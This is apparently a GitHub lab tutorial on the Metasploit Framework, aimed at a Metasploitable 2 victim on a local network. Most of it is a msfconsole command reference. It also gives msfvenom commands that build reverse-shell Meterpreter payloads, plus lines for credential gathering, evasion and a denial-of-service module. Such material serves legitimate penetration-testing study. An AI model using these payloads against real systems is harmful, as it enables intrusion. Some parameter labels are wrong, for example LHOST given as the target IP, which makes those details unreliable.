# Metasploit-Framework


## Overview


## LAB TOOLS
- **Attacker**: Kali Linux use Metasploit-Framework (IP: 192.168.127.128)
- **Victim**: Metasploitable v2 (IP: 192.168.127.129)



## Introduce
### What is Metasploit?
Metasploit Framework is an open-source platform for developing, testing, and executing exploits and payloads. It’s used by penetration testers, red-teamers, and security researchers to validate vulnerabilities, demonstrate impact, and exercise post-exploitation techniques. It bundles exploits, payloads, auxiliary tools (scanners), and post modules.

### Key goals:
  - exploit development & testing
  - payload delivery (e.g., shells, Meterpreter)
  - automation (resource scripts, API)
  - post-exploitation tooling (credential harvesting, pivoting, persistence)


### Terminology
#### **Vulnerability** : This is a weakness which allows an attacker/pentester to breakinto or compromise a system's security. This weakness can exist in the operatingsystem, the application software, or even in the network protocols.
 
#### **Exploit** : An exploit is the means by which an attacker, or pen tester for that matter, takes advantage of a flaw within a system, an application, or a service. An attacker uses an exploit to attack a system in a way that results in a particular desired outcome that the developer never intended. Common exploits include buffer overflows, web application vulnerabilities (such as SQL injection), and configuration errors.

#### **Payload** :  A payload is code that we want the system to execute and that is to be selected and delivered by the Framework. For example, a reverse shell is a payload that creates a connection from the target machine back to the attacker as a Windows command prompt (see Chapter 5), whereas a bind shell is a payload that “binds” a command prompt to a listening port on the target machine, which the attacker can then connect. A payload could also be something as simple as a few commands to be executed on the target operating system.

#### **Auxiliary Modules** : Tools for scanning, sniffing, and other tasks.

#### **Post-Exploitation** : Tools to gather information and maintain access after exploitation.

#### **Meterpreter** :  A powerful payload for command and control on compromised systems.

#### **Listener** :  A listener is a component within Metasploit that waits for an incoming connection of some sort. For example, after the target machine has been exploited, it may call the attacking machine over the Internet. The listener handles that connection, waiting on the attacking machine to be contacted by the exploited system.

#### **Shellcode** :  Shellcode is a set of instructions used as a payload when exploitation occurs. Shellcode is typically written in assembly language. In most cases, a command shell or a Meterpreter shell will be provided after the series of instructions have been performed by the target machine, hence the name.

### **Module** :  A module in the context of this book is a piece of software that can be used by the Metasploit Framework. At times, you may require the use of an exploit module, a software component that conducts the attack. Other times, an auxiliary module may be required to perform an action such as scanning or system enumeration. These interchangeable modules are the core of what makes the Framework so powerful.
  - **Auxiliary**: Supporting modules likes scanners and crawlers.
  - **Post**: Userful in the final stage of penetrations tesing, post-exploitation.

### Common Parameters:
  - **RHOSTS**: IP addresses of the target system.
  - **RPORT**: Port on the target system where the vulnerable application runs.
  - **PAYLOADS**: Code to run the target system.
  - **LHOST:IP**: Addresses of the attacking machine.
  - **LPORT**: Port for the reverse shell to connect back to.


### Additional Component:
  - **Encoders**: Encode exploit and payload evade antivirus.
  - **Evasion**: Modules attempting to directly evade antivirus.
  - **Exploits**: Organized by target system.
  - **NOPs**: No Operation; used as buffers for consistent payload size.
  - **Payloads**: Code to run the target system, categarized as singles, stagers and staGES.



## Metasploit Commands:
#### Launch Metasploit console
The msfconsole is probably the most popular interface to the Metasploit Framework (MSF). It provides an “all-in-one” centralized console and allows you efficient access to virtually all of the options available in the MSF.
````
msfconsole
````
<img width="668" height="576" alt="image" src="https://github.com/user-attachments/assets/55014d31-8fbf-44bc-a38e-0181b6eb618c" />



---



---

### File System and Libraries
 The MSF filesystem is laid out in an intuitive manner and is organized by directory. Some of the more 
important directories are briefly outlined below:
 • Data:Stores resources like binaries, wordlists, and images used by Metasploit for exploits and tasks.
 • Documentation: Contains guides, manuals, and usage instructions for the framework.
 • Lib: Houses the core code base and essential libraries that power Metasploit’s functionality.
 • Modules: The directory for Metasploit’s core modules, including exploits, auxiliary tools, payloads, encoders, and post-exploitation tools.
 • Plugins: Stores plugins that extend Metasploit’s capabilities, adding new features or automating tasks.
 • Scripts: is a directory that contains Meterpreter and other scripts.
 • Tools: is a directory that store various useful command-line utilities.


- Msfconsole Commands
The MSFconsole has many different command options to choose from. The following are a core set of 
Metasploit commands with reference to their output. Type command help to see available command list:


- Back 
Once you have finished working with a particular module, or if you inadvertently select the wrong module, 
you can issue the back command to move out of the current context. This, however is not required. Just as 
you can in commercial routers, you can switch modules from within other modules. As a reminder, 
variables will only carry over if they are set globally.
<img width="430" height="60" alt="image" src="https://github.com/user-attachments/assets/1bfe1112-3829-4a39-a931-5929b7df8bc2" />




## Environment setup

### Installation 
````
sudo apt update
````
<img width="727" height="177" alt="498232843-9c2890d8-76d7-4b60-976c-47a22dfb133d" src="https://github.com/user-attachments/assets/7c120ae2-0cbc-4f1c-a543-d3ffdb86dbae" />

````
sudo apt install metasploit-framework
````
<img width="1897" height="844" alt="498233137-185cc689-d744-4c19-9f2f-68137049f3b1" src="https://github.com/user-attachments/assets/6e17281e-1f04-4ad3-8c3e-a139dd623f43" />

### Metasploit-Framework module
````
cd Desktop
ls
cd /usr/share
ls
````
<img width="988" height="680" alt="image" src="https://github.com/user-attachments/assets/e0fb2356-593c-4479-beed-36805c2d8e29" />

````
cd metasploit-framework
ls
cd modules
ls
````
<img width="979" height="431" alt="image" src="https://github.com/user-attachments/assets/867391ef-4a18-46ea-87af-284bdfc4f167" />

---

###  Nmap tool for automated information gathering
````
msfconsole -h
````
<img width="1087" height="700" alt="image" src="https://github.com/user-attachments/assets/e801b017-42f2-41a1-b824-a9524f5263fd" />


````
msfconsole
````
<img width="704" height="731" alt="image" src="https://github.com/user-attachments/assets/86097784-8deb-4c9e-88f8-a793ab339c8d" />

- Usage of MSFconsole: It is the only supported way to access most of the features within Metasploit.
---

### In metasploit

#### Get help
````
help
````
<img width="944" height="731" alt="image" src="https://github.com/user-attachments/assets/c5cfbd78-4fa2-4cf1-bd32-32eaf3204286" />

or we can use `?`
````
?
````
<img width="957" height="739" alt="image" src="https://github.com/user-attachments/assets/0ab8f085-8f0e-44b7-a89e-af2633f5cb45" />

- It the same with `help`.

#### Tab Completion
The MSFconsole is designed to be fast to use and one of the features that helps this goal is tab completion. With the wide array of modules available, it can be difficult to remember the exact name and path of the particular module you wish to make use of. As with most other shells, entering what you know and pressing ‘Tab’ will present you with a list of options available to you or auto-complete the string if there is only one option. Tab completion depends on the ruby readline extension and nearly every command in the console supports tab completion.
````
use exploit/windows/dce
use .*netapi.*
set LHOST
show
set TARGET
set PAYLOAD windows/shell/
exp
````

---

#### Search for a module
````
search [module]
````
<img width="1095" height="511" alt="image" src="https://github.com/user-attachments/assets/da43c519-42d0-4978-93c1-9a7e2a4d1be4" />

#### Use a module
````
use [module]
````
<img width="727" height="85" alt="image" src="https://github.com/user-attachments/assets/614fb12a-b429-42ed-a316-f396707b86a7" />


#### Display module options
````
show options
````
<img width="1075" height="597" alt="image" src="https://github.com/user-attachments/assets/06b3fa9f-833e-4f03-9fa7-e5b105532761" />

#### Set a value for an option
````
set [option] [value]
````
<img width="725" height="85" alt="image" src="https://github.com/user-attachments/assets/935bf3e9-382f-4779-9d55-d3f0b50958a1" />


#### Execute the selected module
````
exploit
````
<img width="1088" height="136" alt="image" src="https://github.com/user-attachments/assets/0e5bcbbc-a3a9-44da-8582-9ddc0a423de5" />

#### List active sessions
````
sessions
````
<img width="224" height="162" alt="image" src="https://github.com/user-attachments/assets/14909f32-9d7e-424b-b739-de73d8f3d044" />


#### Interact with a session
````
sessions -i [id]
````
<img width="314" height="84" alt="image" src="https://github.com/user-attachments/assets/c5a253dc-b6fb-4889-aa78-a1ce8d5cb9a0" />

#### Set up a payload handler
````
use exploit/multi/handler
````
<img width="463" height="85" alt="image" src="https://github.com/user-attachments/assets/f8a53691-97b7-4933-b1c8-fbce5caa0814" />

- In this not work cause we have no real target.

---


#### Specify payload handler
````
set PAYLOAD [payload]
````
#### Set target host
````
set RHOSTS [payload]
````
#### Set local host IP for reverse connections
````
set LHOST [host]
````
#### Execute post-expliotation modules
````
use post/multi/gather
````
#### Utilize evasion techniques
````
use evasion/[technique]
````
#### Enumerate credentials
````
use auxiliary/scanner/http/enum_creds
````
#### Export data from Metasploit database
````
db_export -f [format] -a [filename]
````
---

## msfvenom:

### Windows
````
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Target IP] LPORT=[XXXX] -f exe > rev_shell.exe
````

### PHP
````
msfvenom -p php/meterpreter_reverse_tcp LHOST=[Target IP] LPORT=[XXXX] -f raw > rev_shell.php
````

### ASP
````
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Target IP] LPORT=[XXXX] -f asp > rev_shell.asp
````

### Python
````
msfvenom -p cmd/unix/reverse_python LHOST=[Target IP] LPORT=[XXXX] -f raw > rew_shell.py
````

---

## Msfconsole Commands
### Back:
Once you have finished working with a particular module, or if you inadvertently select the wrong module, you can issue the back command to move out of the current context. This, however is not required. Just as you can in commercial routers, you can switch modules from within other modules. As a reminder, variables will only carry over if they are set globally.
````
back
````
<img width="674" height="103" alt="image" src="https://github.com/user-attachments/assets/804e707f-7bb3-4ec1-b2f3-bfc6129e296a" />


### Check
There aren’t many exploits that support it, but there is also a check option that will check to see if a target is vulnerable to a particular exploit instead of actually exploiting it.
````
show options
````
<img width="1012" height="460" alt="image" src="https://github.com/user-attachments/assets/ff81bc57-12a9-4a3f-8415-8042cdd49c97" />


### Color
You can enable or disable if the output you get through the msfconsole will contain colors.
````
color
````
<img width="399" height="128" alt="image" src="https://github.com/user-attachments/assets/06dab7f4-7b02-4b48-b93c-e528e0b3502a" />


### Connect
There is a miniature Netcat clone built into the msfconsole that supports SSL, proxies, pivoting, and file transfers. By issuing the connect command with an IP address and port number, you can connect to a remote host from within msfconsole the same as you would with Netcat or Telnet.
````
connect 192.168.127.129
````
<img width="682" height="97" alt="image" src="https://github.com/user-attachments/assets/5ba89840-b8b5-4b5e-95de-8c63504ba785" />


### edit
The edit command will edit the current module with $VISUAL or $EDITOR. By default, this will open the current module in Vim.
````
edit
````
<img width="389" height="39" alt="image" src="https://github.com/user-attachments/assets/90a46170-c9c0-4eb6-b060-9da360747592" />

<img width="990" height="737" alt="image" src="https://github.com/user-attachments/assets/60051b62-3e3b-4646-926b-3a03718d4b87" />


### exit
The exit command will simply exit msfconsole.
````
exit
````
<img width="530" height="111" alt="image" src="https://github.com/user-attachments/assets/d8616ec0-0895-476a-9b5d-3fb619136693" />



### grep
The grep command is similar to Linux grep. It matches a given pattern from the output of another msfconsole command. The following is an example of using grep to match output containing the string “http” from a search for modules containing the string “oracle”.
````
grep
grep http search vsftpd 2.3.4
````
<img width="1013" height="636" alt="image" src="https://github.com/user-attachments/assets/f5de409d-c6d6-4e56-94f7-6e31d7ed79a4" />



### info
- The info command will provide detailed information about a particular module including all options, targets, and other information. Be sure to always read the module description prior to using it as some may have un-desired effects.

- The info command also provides the following information:
  - The author and licensing information
  - Vulnerability references (ie: CVE, BID, etc)
  - Any payload restrictions the module may have

````
info
````
<img width="554" height="706" alt="image" src="https://github.com/user-attachments/assets/7c92c672-6c60-43b9-97a1-3e51aa4f8628" />


### irb
Running the irb command will drop you into a live Ruby interpreter shell where you can issue commands and create Metasploit scripts on the fly. This feature is also very useful for understanding the internals of the Framework.
````
irb
````
<img width="1001" height="432" alt="image" src="https://github.com/user-attachments/assets/302e0579-23e0-4655-a446-50898634c687" />


### jobs
Jobs are modules that are running in the background. The jobs command provides the ability to list and terminate these jobs.
````
job -h
````
<img width="556" height="363" alt="image" src="https://github.com/user-attachments/assets/3b250447-d8cf-4334-abda-dbfe4fe9fe7f" />


### kill
The kill command will kill any running jobs when supplied with the job id.
````
kill 1
````
<img width="464" height="107" alt="image" src="https://github.com/user-attachments/assets/442884d0-c48f-4f00-b5de-049378c76eed" />


### load
The load command loads a plugin from Metasploit’s plugin directory. Arguments are passed as key=val on the shell.
````
load
load pcap_log
````
<img width="743" height="225" alt="image" src="https://github.com/user-attachments/assets/4bfe967c-0db5-4d99-aa41-0d7dc00fb21e" />


### loadpath
The loadpath command will load a third-part module tree for the path so you can point Metasploit at your 0-day exploits, encoders, payloads, etc.
````
loadpath /home/secret/modules
````
<img width="972" height="352" alt="image" src="https://github.com/user-attachments/assets/193a66f9-fd4f-45ad-b106-c932b051fc0e" />


### unload
Conversely, the unload command unloads a previously loaded plugin and removes any extended commands.
````
unload pcap_log
````
<img width="308" height="81" alt="image" src="https://github.com/user-attachments/assets/f60bf786-8563-45d0-93a4-e728c652b14d" />


### route
The route command in Metasploit allows you to route sockets through a session or ‘comm’, providing basic pivoting capabilities. To add a route, you pass the target subnet and network mask followed by the session (comm) number.
````
route -h
````
<img width="669" height="468" alt="image" src="https://github.com/user-attachments/assets/625b8a62-eee1-42de-8d1a-75173b637979" />


### nmae
To search using a descriptive name, use the name keyword.
````
search name:mysql
````
<img width="1033" height="687" alt="image" src="https://github.com/user-attachments/assets/434a3b99-7ebe-4490-8410-036d062b1b19" />



### platform
You can use platform to narrow down your search to modules that affect a specific platform.
````
search platform:aix
````
<img width="1040" height="725" alt="image" src="https://github.com/user-attachments/assets/e05690ab-b76f-4afc-9f35-fee414a55a02" />


### type
- Using the type lets you filter by module type such as auxiliary, post, exploit, etc.
````
search type:post
````
<img width="1034" height="637" alt="image" src="https://github.com/user-attachments/assets/0cfd556c-57c7-4382-afc0-b0df0c66fb4f" />

- Searching with the author keyword lets you search for modules by your favourite author.
````
search author:dookie
````
<img width="1034" height="636" alt="image" src="https://github.com/user-attachments/assets/a6372416-9a8e-4490-a8a5-46395252dce7" />


### multiple
You can also combine multiple keywords together to further narrow down the returned results.
````
search cve:2011 author:jduck platform:linux
````
<img width="1022" height="216" alt="image" src="https://github.com/user-attachments/assets/f67011cb-327d-4c9c-aee7-3c9572579feb" />


### sessions
The sessions command allows you to list, interact with, and kill spawned sessions. The sessions can be shells, Meterpreter sessions, VNC, etc.
````
sessions -h
````
<img width="1027" height="450" alt="image" src="https://github.com/user-attachments/assets/a3992ff6-0f75-4a44-a2fb-c2d02abd706a" />


- To list any active sessions, pass the -l options to sessions.
````
sessions -l
````
<img width="542" height="160" alt="image" src="https://github.com/user-attachments/assets/06c6553b-1749-4119-97bf-400c8322ee85" />

- In this if we already set target we will see.


### set
The set command allows you to configure Framework options and parameters for the current module you are working with.
````
set RHOST 192.168.127.129
show options
````
<img width="1016" height="479" alt="image" src="https://github.com/user-attachments/assets/98ad4a59-e561-4069-bdbe-8392e1d57035" />

- Metasploit also allows you to set an encoder to use at run-time. This is particularly useful in exploit development when you aren’t quite certain as to which payload encoding methods will work with a given exploit.
````
show encoders
````
<img width="997" height="244" alt="image" src="https://github.com/user-attachments/assets/f95ea6bd-f95c-4800-bada-3f92c0dd1dc6" />


### unset
The opposite of the set command, of course, is unset. unset removes a parameter previously configured with set. You can remove all assigned variables with unset all.
````
set RHOSTS 192.168.127.129
set THREADS 50
set
````
<img width="600" height="676" alt="image" src="https://github.com/user-attachments/assets/ca5c9abc-01d1-4937-9284-35c5370407a3" />


### setg
In order to save a lot of typing during a pentest, you can set global variables within msfconsole. You can do this with the setg command. Once these have been set, you can use them in as many exploits and auxiliary modules as you like. You can also save them for use the next time you start msfconsole. However, the pitfall is forgetting you have saved globals, so always check your options before you run or exploit. Conversely, you can use the unsetg command to unset a global variable. In the examples that follow, variables are entered in all-caps (ie: LHOST), but Metasploit is case-insensitive so it is not necessary to do so.
````
setg LHOST 192.168.127.129
````
- After setting your different variables, you can run the save command to save your current environment and settings. With your settings saved, they will be automatically loaded on startup, which saves you from having to set everything again.
````
save
````
<img width="588" height="110" alt="image" src="https://github.com/user-attachments/assets/a5d9d22b-74aa-4c6a-b1a0-84fb38f252f7" />


### show
Entering show at the msfconsole prompt will display every module within Metasploit.
````
show
````
<img width="1032" height="143" alt="image" src="https://github.com/user-attachments/assets/d0d64a50-534e-426a-ab3c-15b5e3e49e37" />

There are a number of show commands you can use but the ones you will use most frequently are show auxiliary, show exploits, show payloads, show encoders, and show nops.


### auxiliary
Executing show auxiliary will display a listing of all of the available auxiliary modules within Metasploit. As mentioned earlier, auxiliary modules include scanners, denial of service modules, fuzzers, and more.
````
show auxiliary
````
<img width="1029" height="603" alt="image" src="https://github.com/user-attachments/assets/95a33aaa-30af-4ac7-a2c2-ca8b5899ffa5" />



### exploits
Naturally, show exploits will be the command you are most interested in running since at its core, Metasploit is all about exploitation. Run show exploits to get a listing of all exploits contained in the framework.
````
show exploits
````
<img width="1030" height="655" alt="image" src="https://github.com/user-attachments/assets/2369da74-03dc-49fb-addb-dc1eace33711" />

---

### Using MSFconsole Payloads
Running show payloads will display all of the different payloads for all platforms available within Metasploit.
````
show payloads
````
<img width="1036" height="688" alt="image" src="https://github.com/user-attachments/assets/611c2245-92a9-4019-b65c-947054f7f960" />


### payloads
As you can see, there are a lot of payloads available. Fortunately, when you are in the context of a particular exploit, running show payloads will only display the payloads that are compatible with that particular exploit. For instance, if it is a Windows exploit, you will not be shown the Linux payloads.
````
show payloads
````
<img width="933" height="174" alt="image" src="https://github.com/user-attachments/assets/42533b3e-118c-4f20-88a9-8ba115833ffd" />


### options
If you have selected a specific module, you can issue the show options command to display which settings are available and/or required for that specific module.
````
show options
````
<img width="1016" height="403" alt="image" src="https://github.com/user-attachments/assets/35ba6ff2-c2a2-486d-80ee-a4700b2e69af" />

### targets
If you aren’t certain whether an operating system is vulnerable to a particular exploit, run the show targets command from within the context of an exploit module to see which targets are supported.
````
show targets
````
<img width="502" height="203" alt="image" src="https://github.com/user-attachments/assets/0855869a-0167-4b11-be4e-e733bb45305e" />

- In this target show it depend on payloads.


### advanced
If you wish the further fine-tune an exploit, you can see more advanced options by running show advanced.
````
show advanced 
````
<img width="1142" height="738" alt="image" src="https://github.com/user-attachments/assets/f5dc6e98-361e-46d4-b49a-812e68d5862a" />


### encoders
Running show encoders will display a listing of the encoders that are available within MSF.
````
show encoders
````
<img width="1100" height="281" alt="image" src="https://github.com/user-attachments/assets/8a148ab8-7cab-45e0-b390-aef418b1a5e4" />


### nops
````
Lastly, issuing the show nops command will display the NOP Generators that Metasploit has to offer.
````
<img width="835" height="411" alt="image" src="https://github.com/user-attachments/assets/f5e6813a-23d0-4847-a02e-efbe3e3f1e8b" />



### use
When you have decided on a particular module to make use of, issue the use command to select it. The use command changes your context to a specific module, exposing type-specific commands. Notice in the output below that any global variables that were previously set are already configured.
````
use dos/windows/smb/ms09_001_write
````
<img width="466" height="70" alt="image" src="https://github.com/user-attachments/assets/eca10cae-f08b-485f-93a9-abf85bfaf5e5" />

-------




























